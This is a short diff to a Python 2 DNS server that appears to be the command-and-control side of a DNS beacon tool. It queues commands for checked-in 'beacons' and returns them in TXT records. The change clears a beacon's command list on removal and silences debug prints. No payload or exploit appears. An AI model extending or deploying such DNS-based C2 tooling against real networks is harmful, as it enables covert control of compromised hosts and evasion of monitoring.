@@ -113,6 +113,7 @@ class DNSResponse:
                         self.packet += struct.pack("!H", 1) #RDLENGTH
                         self.packet += struct.pack("B", 0)  #TXT LENGTH
                     else:
+                        found.cmds = []
                         self.beacons.remove(found)   # remove beacon from list 
 
         else:   # load IP for A record
@@ -185,7 +186,7 @@ class DNSResponse:
 """
 def send_response(addr, server, dnsQuery, txt):
     packet_num = 1
-    print "Sending response"
+    #print "Sending response"
     chk = False
     if dnsQuery.checkin: 
         for x in server.beacons:
@@ -214,7 +215,7 @@ def send_response(addr, server, dnsQuery, txt):
                 if response.fSize <= 255: response.frag = False # last packet
                 response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
                 server.sock.sendto(bytes(response.packet), addr)
-                print "Sent packet %d..." % packet_num
+                #print "Sent packet %d..." % packet_num
                 packet_num += 1
         else:
             response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
@@ -224,5 +225,4 @@ def send_response(addr, server, dnsQuery, txt):
         server.sock.sendto(bytes(response.packet), addr)
 
     server.bList = response.beacons     # update list if any were removed
-    print addr
-    print "Response sent"
+    #print "Response sent"
